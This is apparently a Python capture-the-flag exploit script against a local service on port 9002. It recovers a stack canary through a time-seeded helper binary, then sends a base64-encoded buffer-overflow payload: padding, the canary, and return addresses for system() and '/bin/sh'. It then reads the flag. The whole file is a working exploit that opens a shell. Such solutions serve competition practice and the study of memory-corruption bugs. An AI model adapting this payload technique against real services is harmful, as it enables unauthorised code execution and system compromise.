import socket
import time
import subprocess
import struct
import base64

def toHex(source):
    tot=0
    n=1
    print (source)
    source=source[::-1]
    for i in source:
        if ord(i)>ord('9'):
            tmp=ord(i)-ord('a')+10
            tot=tot+tmp*n
        else:
            tmp=ord(i)-ord('0')
            tot=tot+tmp*n
        n=n*16
    return tot



t=time.time()

pwn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
pwn.connect(("127.0.0.1",9002))

junk,captcha=pwn.recv(4096).split(':')
captcha=captcha[1:len(captcha)]
args=["./randCalc",str(t),captcha.strip()]
subp=subprocess.Popen(args,stdout=subprocess.PIPE)
cookie=toHex(subp.communicate()[0].strip())

addr_system=0x08049187
addr_sh=0x0804b3b6
pwn.send(captcha)
print (struct.pack('I',cookie),struct.pack('I',addr_system),struct.pack('I',addr_sh))
org_payload='\x41'*512+struct.pack('I',cookie)+'\x90'*12+struct.pack('I',addr_system)+struct.pack('I',addr_sh)
payload=base64.b64encode(org_payload)+'\x00'*10+'/bin/sh'

pwn.send(payload+"\n")
pwn.send("cat flag\n")
print (pwn.recv(4096))
print (pwn.recv(4096))
print (pwn.recv(4096))
print (pwn.recv(4096))
